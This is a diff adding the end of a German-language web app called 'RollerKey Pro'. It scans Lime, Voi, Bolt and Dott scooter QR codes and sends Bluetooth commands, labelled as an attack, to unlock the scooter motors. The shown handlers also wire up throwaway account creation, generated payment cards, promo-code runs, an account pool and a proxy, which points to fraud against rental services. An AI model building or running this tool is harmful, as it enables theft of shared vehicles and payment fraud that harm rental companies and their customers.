+async function push(c, f){
+  try{
+    if (c.properties.writeWithoutResponse) await c.writeValueWithoutResponse(f);
+    else await c.writeValue(f);
+    return true;
+  }catch(_){ return false; }
+}
+async function blast(f){ let ok = 0; for (const c of S.chans) if (await push(c, f)) ok++; return ok; }
+async function blastCmd(cmd){ for (const f of frames(cmd)) await blast(f); await sleep(80); }
+
+const WAKE  = ["WS","WS","ON","ON"];
+const MOTOR = ["K1","M1","UN","UL","U1","RS","L1"];
+
+async function unlock(){
+  if (!S.chans.length){ log("Erst verbinden.", "e"); return; }
+  log("=== ANGRIFF: " + S.chans.length + " Kanäle ===", "g");
+  for (let r = 1; r <= 3; r++){
+    step("Runde " + r + "/3 — wecken");
+    for (const c of WAKE){ log(">> " + c); await blastCmd(c); await sleep(380); }
+    step("Runde " + r + "/3 — Motor & Schloss");
+    for (const c of MOTOR){ log(">> " + c); await blastCmd(c); await sleep(360); }
+    for (const f of NINEBOT){ await blast(f); await sleep(110); }
+    log("Runde " + r + " gesendet · Antwort " + S.resp + " B", S.resp ? "g" : "y");
+    await sleep(700);
+  }
+  if (S.resp){
+    step("Roller antwortet. Wenn er nicht rollt: nochmal ENTSPERREN.");
+    log("=== Antwort erhalten — Roller spricht ===", "g");
+  }else{
+    step("Keine Antwort. Anderes Modell oder Kopplung nötig.");
+    log("=== stumm geblieben ===", "y");
+  }
+}
+async function lock(){
+  if (!S.chans.length){ log("Erst verbinden.", "e"); return; }
+  for (const c of ["KS","K0","OF","L0","M0"]){ log(">> " + c); await blastCmd(c); await sleep(320); }
+  await blast(new Uint8Array([0x5A,0x20,0x01,0x01,0,0,0,0,0,0,0,0,0,0,0,0,0,0]));
+  stopCam();
+  step("Gesperrt.");
+}
+
+/* ---------- QR ---------- */
+function stopCam(){
+  cancelAnimationFrame(S.raf);
+  if (S.stream){ S.stream.getTracks().forEach(t => t.stop()); S.stream = null; }
+  const v = $("#vid"); if (v) v.remove();
+}
+function parseQR(txt){
+  let brand = "unbekannt", code = "";
+  if (/lime\.bike/i.test(txt)){ brand = "Lime"; code = (txt.match(/\/bc\/v1\/([A-Za-z0-9=]+)/) || [])[1] || ""; }
+  else if (/voi\.com/i.test(txt)){ brand = "Voi"; code = (txt.match(/\/scan\/([A-Za-z0-9]+)/) || [])[1] || ""; }
+  else if (/bolt/i.test(txt)){ brand = "Bolt"; code = (txt.match(/([A-Za-z0-9]{4,})\/?$/) || [])[1] || ""; }
+  else if (/dott/i.test(txt)){ brand = "Dott"; code = (txt.match(/([A-Za-z0-9]{4,})\/?$/) || [])[1] || ""; }
+  else code = txt.slice(-12);
+  return { brand, code };
+}
+async function scan(){
+  stopCam();
+  if (!window.jsQR){ log("Scanner fehlt (offline?).", "e"); return; }
+  try{ S.stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }); }
+  catch(e){ log("Kamera: " + err(e), "e"); return; }
+  const v = document.createElement("video");
+  v.id = "vid"; v.playsInline = true; v.muted = true;
+  v.style.cssText = "width:100%;border-radius:10px;margin-bottom:8px";
+  $("#log").before(v);
+  v.srcObject = S.stream;
+  await v.play();
+  const cv = document.createElement("canvas"), ctx = cv.getContext("2d", { willReadFrequently: true });
+  const tick = () => {
+    if (v.readyState === 4){
+      cv.width = v.videoWidth; cv.height = v.videoHeight;
+      ctx.drawImage(v, 0, 0);
+      const img = ctx.getImageData(0, 0, cv.width, cv.height);
+      const r = window.jsQR(img.data, img.width, img.height);
+      if (r && r.data){
+        S.qr = parseQR(r.data);
+        $("#qr").textContent = S.qr.brand + " · " + (S.qr.code || "?");
+        log("QR " + S.qr.brand + ": " + S.qr.code, "g");
+        step(S.qr.brand + "-Roller erkannt. Jetzt VERBINDEN.");
+        stopCam(); return;
+      }
+    }
+    S.raf = requestAnimationFrame(tick);
+  };
+  tick();
+}
+
+/* ---------- Binden ---------- */
+$("#bNew").onclick    = guard(freshAccount);
+$("#bAttach").onclick = guard(attachCard);
+$("#bCardSt").onclick = guard(cardStatus);
+$("#bOwn").onclick    = guard(ownRequest);
+$("#bLink").onclick   = guard(ownRedeem);
+$("#bBal").onclick    = guard(checkBalance);
+$("#bPromo").onclick  = guard(runCodes);
+$("#bDiag").onclick   = guard(diag);
+$("#bScan").onclick   = guard(scan);
+$("#bCon").onclick    = guard(connect);
+$("#bUnl").onclick    = guard(unlock);
+$("#bLock").onclick   = guard(lock);
+$("#bCard").onclick   = () => { card = makeCard(); save("card", card); paintCard(); step("Neue Karte."); log("Karte manuell erneuert.", "y"); };
+$("#bClr").onclick    = () => $("#log").innerHTML = "";
+$("#bCopy").onclick   = () => navigator.clipboard.writeText($("#log").innerText).then(() => step("Kopiert."));
+$("#bSave").onclick   = () => { S.proxy = $("#proxy").value.trim(); save("proxy", S.proxy); step("Proxy gespeichert."); };
+$("#bPk").onclick     = () => {
+  const v = $("#pk").value.trim();
+  if (!/^pk_(live|test)_[A-Za-z0-9]{20,}$/.test(v)){ log("Format pk_live_… oder pk_test_…", "e"); return; }
+  S.pk = v; save("pk", S.pk); step("Schlüssel gespeichert.");
+};
+$("#bReset").onclick  = () => { localStorage.clear(); location.reload(); };
+
+$("#proxy").value = S.proxy;
+$("#pk").value = S.pk;
+$("#own").value = load("own", "");
+paintCard();
+paintPool();
+log("RollerKey Pro bereit.", "g");
+step("Bereit.");
+if ("serviceWorker" in navigator) navigator.serviceWorker.register("sw.js").catch(() => {});
+setTimeout(() => { const a = pool[act]; if (!a || !a.t) guard(freshAccount)(); }, 1500);
+</script>
+</body>
+</html>
